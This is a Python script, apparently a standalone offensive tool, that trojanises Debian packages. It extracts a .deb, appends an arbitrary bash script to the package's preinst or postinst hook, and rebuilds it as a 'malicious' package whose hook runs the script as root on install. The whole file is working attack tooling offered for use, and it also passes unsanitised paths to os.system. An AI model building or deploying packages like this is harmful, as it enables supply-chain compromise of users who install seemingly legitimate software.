#!/usr/bin/python3

'''
Tool Name :: Malicious Debian Package Maker 
Author :: Padsala Trushal
Date :: 24 Oct 2021
'''

import os
import argparse
import sys
from colorama import Fore, Style


def get_arguments():
	parser = argparse.ArgumentParser(description='Inject bash script in debian package',usage=f'python3 {sys.argv[0]} -p debian_package -s bash_script',epilog=f'EXAMPLE - python3 {sys.argv[0]} -p /tmp/file.deb -s /tmp/script.sh')

	parser.add_argument('-v','--version',action='version',version='1.4',help='show the version of program')

	parser.add_argument('-s',metavar='bash script',dest='bash',help='Enter your bash script path')


	parser.add_argument('-p',metavar='debian package',dest='deb',help='Enter your debian package path')

	args = parser.parse_args()

	if len(sys.argv) <= 4:
		parser.print_usage()
		sys.exit()
		
	return args

args = get_arguments()

deb = args.deb
bash = args.bash

if ".deb" not in deb:
	sys.stderr.write("Enter vaild debian file")
	sys.exit()

if ".sh" not in bash:
	sys.stderr.write("Enter vaild bash file")
	sys.exit()


if not os.path.exists(deb) or not os.path.exists(bash):
    sys.stderr.write("File Doesn't Exists")
    sys.exit()


def extract(file):
	cmd = f"dpkg-deb -R {file} /tmp/{file.split('.deb')[0]} > /tmp/log.txt"  
	os.system(cmd)


debpath = f"/tmp/{deb.split('.deb')[0]}"
injectablefile = ""


def checkforinjectablefile():
	global debpath,injectablefile
	
	postinst = debpath+"/DEBIAN/postinst"
	preinst = debpath+"/DEBIAN/preinst"
	
	if os.path.exists(postinst) or os.path.exists(preinst):
		if os.path.exists(preinst):
			injectablefile = preinst
		else:
			injectablefile = postinst	

	else:
		file = open(preinst,'w+')
		file.close()
		os.chmod(preinst,0o755)
		injectablefile = preinst


def read_content(script: str):
    file = open(script, 'r')
    content = file.read()
    file.close()
    return content

payload = read_content(bash)


def embed(script: str, payload: str):
	file = open(script,'a')
	file.write(payload)
	file.close()


def build():
	global debpath
	malicious = os.getcwd()+"/malicious"
	if not os.path.exists(malicious):
		os.mkdir("malicious")
	build_cmd = f"dpkg-deb -b {debpath} {malicious} > /tmp/log.txt"
	os.system(build_cmd)

def clean():
	cmd = f"rm -rf {debpath} && rm /tmp/log.txt"
	os.system(cmd)

def color_print(string: str , color: str, bold=False):
	colors = {'red': Fore.RED,'blue': Fore.BLUE,
	'green': Fore.GREEN,'yellow': Fore.YELLOW}
	if bold:
		print(Style.BRIGHT+colors[color]+string+Style.RESET_ALL)
	else:
		print(colors[color]+string+Style.RESET_ALL)

def main():
	color_print(f'[+]Extracting File from {deb} Package','yellow',True)
	extract(deb)	
	
	color_print(f'[+]Checking for Injectable script','red',True)
	checkforinjectablefile()

	color_print(f'[+]Injecting bash scipt','green',True)
	embed(injectablefile,payload)

	color_print(f'[+]Building Malicious Package','blue',True)
	build()

	color_print(f'[+]Cleaning Up','red',True)
	clean()

	color_print(f'[+]Successfully created Malicious Package','green',True)

main()
